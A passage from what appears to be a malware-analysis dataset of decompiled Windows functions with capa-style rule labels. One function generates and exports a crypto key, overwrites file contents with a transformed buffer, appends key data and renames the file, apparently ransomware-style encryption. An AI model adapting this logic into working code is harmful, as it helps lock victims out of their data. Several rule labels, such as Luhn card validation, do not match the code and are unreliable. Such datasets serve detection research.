(*_sym.imp.KERNEL32.dll_CreateFileW)(var_20h, 0xc0000000, 0, 0, 2, 0x80, 0);\n    arg_8h_00 = 1;\n    fcn.00403aec(1);\n    fcn.00403aec(1);\n    fcn.00403aec(1);\n    iVar3 = var_60h;\n    if (var_60h != 0) {\n        (*_sym.imp.KERNEL32.dll_SetFilePointer)(var_60h, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar3, lpBuffer, *0x416dd0, &lpNumberOfBytesWritten, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    fcn.0040a3ea(lpBuffer);\n    fcn.00403aec(1);\n    fcn.004083f8(arg_8h_00);\n    return;\n}\n",
        "token_count": 637
    },
    "00402a6d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402a6d(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_ch;\n    uint phKey;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_CryptGenKey)(*0x417aec, 0x6610, 1, &phKey);\n    if (iVar2 != 0) goto code_r0x00402a9c;\n    do {\n        do {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x00402a9c:\n            pcVar1 = _sym.imp.ADVAPI32.dll_CryptExportKey;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_CryptExportKey)(phKey, 0, 8, 0, 0, &var_4h);\n        } while (iVar2 == 0);\n        arg_ch = fcn.004083ed(var_4h);\n        iVar2 = (*pcVar1)(phKey, 0, 8, 0, arg_ch, &var_4h);\n    } while (iVar2 == 0);\n    (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)(phKey);\n    fcn.00405b36(arg_8h, arg_ch, var_4h);\n    fcn.0040a3ea(arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 328
    },
    "00402af7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402af7(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    code *pcVar8;\n    uint *puVar9;\n    code *pcVar10;\n    bool bVar11;\n    int64_t iVar12;\n    uint32_t uVar13;\n    uint *arg_8h_00;\n    uint noname_3_00;\n    uint noname_4_00;\n    uint lpNumberOfBytesRead;\n    uint32_t var_110h;\n    uint var_10ch;\n    uint var_108h;\n    int32_t var_104h;\n    int32_t var_100h;\n    int32_t var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint32_t lpFileSize;\n    int32_t var_e8h;\n    uint32_t var_e4h;\n    uint32_t var_e0h;\n    uint lpBuffer;\n    int32_t hObject;\n    uint var_cdh;\n    uint var_b0h;\n    uint var_94h;\n    uint *var_78h;\n    uint var_68h;\n    uint32_t var_64h;\n    uint *var_5ch;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint *var_40h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint *var_24h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_8h;\n    \n    var_8h = *0x416084 ^ &stack0xfffffffc;\n    var_100h = fcn.004083ed(*0x416d7c);\n    puVar4 = *0x416d6c;\n    if (*0x416d80 < 0x10) {\n        puVar4 = 0x416d6c;\n    }\n    puVar4 = puVar4 + *0x416d7c;\n    puVar1 = *0x416d6c;\n    if (*0x416d80 < 0x10) {\n        puVar1 = 0x416d6c;\n    }\n    if (puVar1 != puVar4) {\n        iVar5 = var_100h - puVar1;\n        do {\n            puVar1[iVar5] = *puVar1;\n            puVar1 = puVar1 + 1;\n        } while (puVar1 != puVar4);\n    }\n    fcn.00402a6d(&var_5ch);\n    pcVar10 = _sym.imp.CRYPT32.dll_CryptStringToBinaryA;\n    var_10ch = 0;\n    puVar9 = var_5ch;\n    if (var_48h < 0x10) {\n        puVar9 = &var_5ch;\n    }\n    iVar5 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(puVar9, var_4ch, 1, 0, &var_10ch, 0, 0);\n    if (iVar5 != 0) goto code_r0x00402ba2;\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x00402ba2:\n                var_f8h = fcn.004083ed(var_10ch);\n                puVar9 = var_5ch;\n                if (var_48h < 0x10) {\n                    puVar9 = &var_5ch;\n                }\n                iVar5 = (*pcVar10)(puVar9, var_4ch, 1, var_f8h, &var_10ch, 0, 0);\n            } while (iVar5 == 0);\n            fcn.00402a6d(&var_78h);\n            var_108h = 0;\n            puVar9 = var_78h;\n            if (var_64h < 0x10) {\n                puVar9 = &var_78h;\n            }\n            iVar5 = (*pcVar10)(puVar9, var_68h, 1, 0, &var_108h, 0, 0);\n        } while (iVar5 == 0);\n        uVar2 = fcn.004083ed(var_108h);\n        puVar9 = var_78h;\n        if (var_64h < 0x10) {\n            puVar9 = &var_78h;\n        }\n        puVar7 = &var_108h;\n        noname_4_00 = 1;\n        noname_3_00 = var_68h;\n        var_f4h = uVar2;\n        iVar5 = (*pcVar10)();\n    } while (iVar5 == 0);\n    arg_8h_00 = &var_5ch;\n    fcn.00403573(arg_8h_00);\n    fcn.00405c6a(&var_24h, arg_8h_00, puVar9, noname_3_00, noname_4_00, uVar2, puVar7);\n    puVar7 = &var_78h;\n    fcn.00403573(puVar7);\n    fcn.00405c6a(&var_40h, puVar7, arg_8h_00, puVar9, noname_3_00, noname_4_00, uVar2);\n    var_cdh._0_1_ = 10;\n    puVar9 = var_24h;\n    if (var_10h < 0x10) {\n        puVar9 = &var_24h;\n    }\n    puVar7 = var_24h;\n    if (var_10h < 0x10) {\n        puVar7 = &var_24h;\n    }\n    fcn.0040437a(&var_e0h, puVar7, puVar9 + var_14h);\n    puVar9 = var_24h;\n    if (var_10h < 0x10) {\n        puVar9 = &var_24h;\n    }\n    fcn.004036a1(var_e0h, puVar9 + var_14h);\n    var_cdh._0_1_ = 0xd;\n    puVar9 = var_24h;\n    if (var_10h < 0x10) {\n        puVar9 = &var_24h;\n    }\n    puVar7 = var_24h;\n    if (var_10h < 0x10) {\n        puVar7 = &var_24h;\n    }\n    fcn.0040437a(&var_e0h, puVar7, puVar9 + var_14h);\n    puVar9 = var_24h;\n    if (var_10h < 0x10) {\n        puVar9 = &var_24h;\n    }\n    fcn.004036a1(var_e0h, puVar9 + var_14h);\n    var_cdh._0_1_ = 10;\n    puVar9 = var_40h;\n    if (var_2ch < 0x10) {\n        puVar9 = &var_40h;\n    }\n    puVar7 = var_40h;\n    if (var_2ch < 0x10) {\n        puVar7 = &var_40h;\n    }\n    fcn.0040437a(&var_e0h, puVar7, puVar9 + var_30h);\n    puVar9 = var_40h;\n    if (var_2ch < 0x10) {\n        puVar9 = &var_40h;\n    }\n    fcn.004036a1(var_e0h, puVar9 + var_30h);\n    var_cdh._0_1_ = 0xd;\n    puVar9 = var_40h;\n    if (var_2ch < 0x10) {\n        puVar9 = &var_40h;\n    }\n    puVar7 = var_40h;\n    if (var_2ch < 0x10) {\n        puVar7 = &var_40h;\n    }\n    fcn.0040437a(&var_e0h, puVar7, puVar9 + var_30h);\n    puVar9 = var_40h;\n    if (var_2ch < 0x10) {\n        puVar9 = &var_40h;\n    }\n    fcn.004036a1(var_e0h, puVar9 + var_30h);\n    var_104h = fcn.004083ed(var_14h);\n    var_fch = fcn.004083ed(var_30h);\n    puVar9 = var_24h;\n    if (var_10h < 0x10) {\n        puVar9 = &var_24h;\n    }\n    puVar9 = var_14h + puVar9;\n    if (var_10h < 0x10) {\n        var_24h = &var_24h;\n    }\n    if (var_24h != puVar9) {\n        iVar5 = var_104h - var_24h;\n        do {\n            *(iVar5 + var_24h) = *var_24h;\n            var_24h = var_24h + 1;\n        } while (var_24h != puVar9);\n    }\n    puVar9 = var_40h;\n    if (var_2ch < 0x10) {\n        puVar9 = &var_40h;\n    }\n    puVar9 = var_30h + puVar9;\n    if (var_2ch < 0x10) {\n        var_40h = &var_40h;\n    }\n    if (var_40h != puVar9) {\n        iVar5 = var_fch - var_40h;\n        do {\n            *(iVar5 + var_40h) = *var_40h;\n            var_40h = var_40h + 1;\n        } while (var_40h != puVar9);\n    }\n    puVar9 = arg_8h;\n    if (arg_1ch < 8) {\n        puVar9 = &arg_8h;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(puVar9);\n    (*_sym.imp.KERNEL32.dll_SetFileAttributesW)(puVar9, uVar3 & 0xfffffffe);\n    puVar9 = arg_8h;\n    if (arg_1ch < 8) {\n        puVar9 = &arg_8h;\n    }\n    hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(puVar9, 0xc0000000, 0, 0, 3, 0, 0);\n    if (hObject != 0) {\n        (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(hObject, &lpFileSize);\n        uVar3 = lpFileSize;\n        if ((var_e8h < 0) || ((var_e8h < 1 && (lpFileSize < 0xc35001)))) {\n            var_e0h = 0;\n            uVar13 = lpFileSize;\n            iVar12 = fcn.0040ed90(lpFileSize, var_e8h, 0x10, 0);\n            while (iVar12 != 0) {\n                bVar11 = uVar3 != 0;\n                uVar3 = uVar3 - 1;\n                var_e8h = var_e8h + -1 + bVar11;\n                var_e0h = var_e0h + 1;\n                uVar13 = uVar3;\n                iVar12 = fcn.0040ed90();\n                lpFileSize = uVar3;\n            }\n            if ((var_e8h < 0) || ((var_e8h < 1 && (uVar3 < 0x27101)))) {\n                var_110h = uVar3;\n                lpBuffer = fcn.004083ed(uVar3, uVar13);\n                pcVar10 = _sym.imp.KERNEL32.dll_SetFilePointerEx;\n                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hObject, 0, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_ReadFile)(hObject, lpBuffer, uVar3, &lpNumberOfBytesRead, 0);\n                fcn.0040128f(lpBuffer, uVar3);\n                (*pcVar10)(hObject, 0, 0, 0, 0);\n                uVar3 = var_110h;\n            }\n            else {\n                lpBuffer = fcn.004083ed(160000, uVar13);\n                pcVar10 = _sym.imp.KERNEL32.dll_SetFilePointerEx;\n                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hObject, 0, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_ReadFile)(hObject, lpBuffer, 160000, &lpNumberOfBytesRead, 0);\n                fcn.0040128f(lpBuffer, 160000);\n                (*pcVar10)(hObject, 0, 0, 0, 0);\n                uVar3 = 160000;\n            }\n            pcVar8 = _sym.imp.KERNEL32.dll_WriteFile;\n            (*_sym.imp.KERNEL32.dll_WriteFile)(hObject, lpBuffer, uVar3, &var_f0h, 0);\n            fcn.0040a3ea(lpBuffer);\n            iVar6 = var_e0h >> 0x1f;\n            var_e4h = var_e0h;\n            bVar11 = CARRY4(var_e0h, lpFileSize);\n            iVar5 = var_e0h + lpFileSize;\n            var_e0h = iVar6;\n            (*pcVar10)(hObject, iVar5, iVar6 + var_e8h + bVar11, 0, 0);\n            (*pcVar8)(hObject, var_104h, var_14h, &var_f0h, 0);\n            (*pcVar10)(hObject, var_14h + var_e4h + lpFileSize, \n                       var_e0h + CARRY4(var_14h, var_e4h) + var_e8h + CARRY4(var_14h + var_e4h, lpFileSize), 0, 0);\n            (*pcVar8)(hObject, var_fch, var_30h, &var_f0h, 0);\n            var_110h = 0;\n            uVar3 = var_30h + var_14h + var_e4h;\n            iVar5 = uVar3 + lpFileSize;\n            iVar6 = CARRY4(var_30h, var_14h) + var_e0h + CARRY4(var_30h + var_14h, var_e4h) + var_e8h +\n                    CARRY4(uVar3, lpFileSize);\n        }\n        else {\n            lpBuffer = fcn.004083ed(3200000);\n            pcVar10 = _sym.imp.KERNEL32.dll_SetFilePointerEx;\n            (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hObject, 0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_ReadFile)(hObject, lpBuffer, 3200000, &lpNumberOfBytesRead, 0);\n            fcn.0040128f(lpBuffer, 3200000);\n            (*pcVar10)(hObject, 0, 0, 0, 0);\n            pcVar8 = _sym.imp.KERNEL32.dll_WriteFile;\n            (*_sym.imp.KERNEL32.dll_WriteFile)(hObject, lpBuffer, 3200000, &var_f0h, 0);\n            fcn.0040a3ea(lpBuffer);\n            (*pcVar10)(hObject, lpFileSize, var_e8h, 0, 0);\n            (*pcVar8)(hObject, var_104h, var_14h, &var_f0h, 0);\n            (*pcVar10)(hObject, var_14h + lpFileSize, var_e8h + CARRY4(var_14h, lpFileSize), 0, 0);\n            (*pcVar8)(hObject, var_fch, var_30h, &var_f0h, 0);\n            var_e0h = 0;\n            iVar5 = var_30h + var_14h + lpFileSize;\n            iVar6 = CARRY4(var_30h, var_14h) + var_e8h + CARRY4(var_30h + var_14h, lpFileSize);\n        }\n        (*pcVar10)(hObject, iVar5, iVar6, 0, 0);\n        (*pcVar8)(hObject, var_100h, *0x416d7c, &var_f0h, 0);\n    }\n    fcn.0040a3ea(var_100h);\n    fcn.0040a3ea(var_104h);\n    fcn.0040a3ea(var_fch);\n    fcn.0040a3ea(var_f8h);\n    fcn.0040a3ea(var_f4h);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    fcn.00407f7a(&var_b0h);\n    fcn.00404324(0x4133ac);\n    puVar9 = fcn.00404453();\n    if (7 < puVar9[5]) {\n        puVar9 = *puVar9;\n    }\n    puVar7 = arg_8h;\n    if (arg_1ch < 8) {\n        puVar7 = &arg_8h;\n    }\n    (*_sym.imp.KERNEL32.dll_MoveFileW)(puVar7, puVar9);\n    fcn.00403aec(1);\n    fcn.00403aec(1);\n    fcn.00403aec(1);\n    fcn.0040135c(1);\n    uVar2 = 1;\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.00403aec(1);\n    fcn.004083f8(uVar2);\n    return;\n}\n",
        "token_count": 4148
    },
    "0040334e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040334e(uint arg_8h)\n\n{\n    uint *arg_8h_00;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    fcn.00403753(arg_8h);\n    arg_8h_00 = &var_20h;\n    fcn.00403753(arg_8h_00);\n    fcn.004016c3(arg_8h_00);\n    fcn.00403aec(1);\n    fcn.004083f8(arg_8h);\n    return;\n}\n",
        "token_count": 145
    },
    "00403637": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403637(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar3 = unaff_ESI[4];\n    if (uVar3 < param_1) {\n        uVar3 = fcn.0040837f(\"invalid string position\");\n        param_1 = extraout_ECX;\n    }\n    uVar3 = uVar3 - param_1;\n    if (uVar3 < in_EAX) {\n        in_EAX = uVar3;\n    }\n    if (in_EAX != 0) {\n        puVar4 = unaff_ESI;\n        puVar2 = unaff_ESI;\n        if (0xf < unaff_ESI[5]) {\n            puVar4 = *unaff_ESI;\n            puVar2 = *unaff_ESI;\n        }\n        fcn.00408a00(puVar4 + param_1, puVar2 + in_EAX + param_1, uVar3 - in_EAX);\n        iVar1 = unaff_ESI[4];\n        unaff_ESI[4] = iVar1 - in_EAX;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + (iVar1 - in_EAX)) = 0;\n    }\n    return;\n}\n",
        "token_count": 348
    },
    "00403832": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403832(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t in_EAX;\n    uint32_t *unaff_EDI;\n    \n    uVar1 = unaff_EDI[1];\n    if ((in_EAX < uVar1) && (uVar2 = *unaff_EDI,  uVar2 <= in_EAX)) {\n        if (uVar1 == unaff_EDI[2]) {\n            fcn.00403b2c();\n        }\n        if (unaff_EDI[1] == 0) goto code_r0x00403880;\n        in_EAX = ((in_EAX - uVar2) / 0x1c) * 0x1c + *unaff_EDI;\n    }\n    else {\n        if (uVar1 == unaff_EDI[2]) {\n            fcn.00403b2c();\n        }\n        if (unaff_EDI[1] == 0) goto code_r0x00403880;\n    }\n    fcn.00403573(in_EAX);\ncode_r0x00403880:\n    unaff_EDI[1] = unaff_EDI[1] + 0x1c;\n    return;\n}\n",
        "token_count": 278
    },
    "00403887": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403887(void)\n\n{\n    uint32_t in_EAX;\n    \n    if ((in_EAX < *0x417b74) && (*0x417b70 <= in_EAX)) {\n        if (*0x417b74 == *0x417b78) {\n            fcn.00403b83();\n        }\n    }\n    else if (*0x417b74 == *0x417b78) {\n        fcn.00403b83();\n    }\n    if (*0x417b74 != 0) {\n        fcn.004044e5();\n    }\n    *0x417b74 = *0x417b74 + 0x1c;\n    return;\n}\n",
        "token_count": 155
    },
    "004038f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004038f1(void)\n\n{\n    uint *in_EAX;\n    uint *unaff_EBX;\n    \n    if (in_EAX != unaff_EBX) {\n        fcn.0040135c(1);\n        if (unaff_EBX[5] < 0x10) {\n            fcn.00408a00(in_EAX, unaff_EBX, unaff_EBX[4] + 1);\n        }\n        else {\n            *in_EAX = *unaff_EBX;\n            *unaff_EBX = 0;\n        }\n        in_EAX[4] = unaff_EBX[4];\n        in_EAX[5] = unaff_EBX[5];\n        unaff_EBX[4] = 0;\n        unaff_EBX[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00403936": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403936(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    uint *arg_8h_00;\n    uint *in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t arg_10h;\n    \n    uVar2 = in_EAX[4];\n    uVar3 = arg_8h;\n    if (uVar2 < arg_8h) {\n        uVar2 = fcn.0040837f(\"invalid string position\");\n        uVar3 = extraout_ECX;\n    }\n    arg_10h = uVar2 - uVar3;\n    if (arg_ch < uVar2 - uVar3) {\n        arg_10h = arg_ch;\n    }\n    if (in_ECX == in_EAX) {\n        fcn.00403637();\n        fcn.00403637();\n    }\n    else {\n        cVar1 = fcn.00403c7d(0);\n        if (cVar1 != '\\0') {\n            if (0xf < in_EAX[5]) {\n                in_EAX = *in_EAX;\n            }\n            arg_8h_00 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                arg_8h_00 = *in_ECX;\n            }\n            fcn.00408410(arg_8h_00, in_EAX + arg_8h, arg_10h);\n            in_ECX[4] = arg_10h;\n            if (0xf < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            *(in_ECX + arg_10h) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 407
    },
    "004039c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004039c5(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint *in_ECX;\n    uint32_t unaff_EDI;\n    \n    if (in_ECX[4] < in_EAX) {\n        in_EAX = in_ECX[4];\n    }\n    uVar1 = in_EAX;\n    if (unaff_EDI <= in_EAX) {\n        uVar1 = unaff_EDI;\n    }\n    if (0xf < in_ECX[5]) {\n        in_ECX = *in_ECX;\n    }\n    uVar1 = fcn.00408d61(in_ECX, arg_8h, uVar1);\n    if (uVar1 == 0) {\n        if (in_EAX < unaff_EDI) {\n            uVar1 = 0xffffffff;\n        }\n        else {\n            uVar1 = in_EAX != unaff_EDI;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 228
    },
    "00403a0a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403a0a(void)\n\n{\n    uint *in_EAX;\n    uint *unaff_EBX;\n    \n    if (in_EAX != unaff_EBX) {\n        fcn.00403aec(1);\n        if (unaff_EBX[5] < 8) {\n            fcn.00408a00(in_EAX, unaff_EBX, unaff_EBX[4] * 2 + 2);\n        }\n        else {\n            *in_EAX = *unaff_EBX;\n            *unaff_EBX = 0;\n        }\n        in_EAX[4] = unaff_EBX[4];\n        in_EAX[5] = unaff_EBX[5];\n        unaff_EBX[4] = 0;\n        unaff_EBX[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00403a52": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403a52(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    uint *in_ECX;\n    uint *arg_8h_00;\n    uint32_t uVar3;\n    \n    uVar3 = in_EAX[4];\n    uVar2 = arg_8h;\n    if (uVar3 < arg_8h) {\n        uVar2 = fcn.0040837f(\"invalid string position\");\n    }\n    uVar3 = uVar3 - uVar2;\n    if (arg_ch < uVar3) {\n        uVar3 = arg_ch;\n    }\n    if (in_ECX == in_EAX) {\n        fcn.00403d5f();\n        fcn.00403d5f();\n    }\n    else {\n        cVar1 = fcn.00403dd0(0);\n        if (cVar1 != '\\0') {\n            if (7 < in_EAX[5]) {\n                in_EAX = *in_EAX;\n            }\n            arg_8h_00 = in_ECX;\n            if (7 < in_ECX[5]) {\n                arg_8h_00 = *in_ECX;\n            }\n            fcn.00408410(arg_8h_00, in_EAX + arg_8h * 2, uVar3 * 2);\n            in_ECX[4] = uVar3;\n            if (7 < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            *(uVar3 * 2 + in_ECX) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 380
    },
    "00403be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403be0(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *arg_8h;\n    uint *unaff_ESI;\n    \n    cVar1 = fcn.004040e4(param_1);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00403c7d(0);\n        if (cVar1 != '\\0') {\n            arg_8h = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                arg_8h = *unaff_ESI;\n            }\n            fcn.00408410(arg_8h, param_1, in_EAX);\n            unaff_ESI[4] = in_EAX;\n            if (0xf < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + in_EAX) = 0;\n        }\n    }\n    else {\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        fcn.00403936(param_1 - unaff_ESI, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "00403ce4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403ce4(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *arg_8h;\n    uint *unaff_ESI;\n    uint var_4h;\n    \n    cVar1 = fcn.0040420d(param_1);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00403dd0(0);\n        if (cVar1 != '\\0') {\n            arg_8h = unaff_ESI;\n            if (7 < unaff_ESI[5]) {\n                arg_8h = *unaff_ESI;\n            }\n            fcn.00408410(arg_8h, param_1, in_EAX * 2);\n            unaff_ESI[4] = in_EAX;\n            if (7 < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(in_EAX * 2 + unaff_ESI) = 0;\n        }\n    }\n    else {\n        if (7 < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        fcn.00403a52(param_1 - unaff_ESI >> 1, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 293
    },
    "00403d5f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403d5f(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar3 = unaff_ESI[4];\n    if (uVar3 < param_1) {\n        uVar3 = fcn.0040837f(\"invalid string position\");\n        param_1 = extraout_ECX;\n    }\n    uVar3 = uVar3 - param_1;\n    if (uVar3 < in_EAX) {\n        in_EAX = uVar3;\n    }\n    if (in_EAX != 0) {\n        puVar4 = unaff_ESI;\n        puVar2 = unaff_ESI;\n        if (7 < unaff_ESI[5]) {\n            puVar4 = *unaff_ESI;\n            puVar2 = *unaff_ESI;\n        }\n        fcn.00408a00(puVar4 + param_1 * 2, puVar2 + (param_1 + in_EAX) * 2, (uVar3 - in_EAX) * 2);\n        iVar1 = unaff_ESI[4];\n        unaff_ESI[4] = iVar1 - in_EAX;\n        if (7 < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + (iVar1 - in_EAX) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "00403e3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00403e3c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040ec8c(0x14);\n    uVar4 = *(unaff_EBP + 8);\n    if (0x9249249 < uVar4) {\n        fcn.00408332(\"vector<T> too long\");\n    }\n    if ((extraout_ECX[2] - *extraout_ECX) / 0x1c < uVar4) {\n        uVar2 = fcn.00404249();\n        *(unaff_EBP + -0x18) = uVar2;\n        *(unaff_EBP + -4) = 0;\n        fcn.004049ed(*extraout_ECX, extraout_ECX[1], *(unaff_EBP + -0x18));\n        *(unaff_EBP + -4) = 0xffffffff;\n        iVar3 = extraout_ECX[1];\n        *(unaff_EBP + -0x1c) = iVar3;\n        iVar1 = *extraout_ECX;\n        iVar3 = (iVar3 - iVar1) / 0x1c;\n        *(unaff_EBP + -0x20) = iVar3;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -0x14) = iVar1;\n            if (iVar1 != *(unaff_EBP + -0x1c)) {\n                do {\n                    fcn.0040135c(1);\n                    *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 0x1c;\n                } while (*(unaff_EBP + -0x14) != *(unaff_EBP + -0x1c));\n                uVar4 = *(unaff_EBP + 8);\n                iVar3 = *(unaff_EBP + -0x20);\n            }\n            fcn.004088ab(*extraout_ECX);\n        }\n        iVar1 = *(unaff_EBP + -0x18);\n        extraout_ECX[2] = uVar4 * 0x1c + iVar1;\n        extraout_ECX[1] = iVar3 * 0x1c + iVar1;\n        *extraout_ECX = iVar1;\n    }\n    fcn.0040ecc2();\n    return;\n}\n",
        "token_count": 628
    },
    "00403f14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00403f14(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint32_t uVar4;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040ec8c(0x10);\n    uVar4 = *(unaff_EBP + 8);\n    if (0x9249249 < uVar4) {\n        fcn.00408332(\"vector<T> too long\");\n    }\n    if ((*0x417b78 - *0x417b70) / 0x1c < uVar4) {\n        arg_10h = fcn.00404249();\n        *(unaff_EBP + -0x18) = arg_10h;\n        *(unaff_EBP + -4) = 0;\n        fcn.00404a4e(*0x417b70, *0x417b74, arg_10h);\n        *(unaff_EBP + -4) = 0xffffffff;\n        iVar1 = *0x417b74;\n        iVar3 = *0x417b70;\n        iVar2 = *0x417b74 - *0x417b70;\n        if 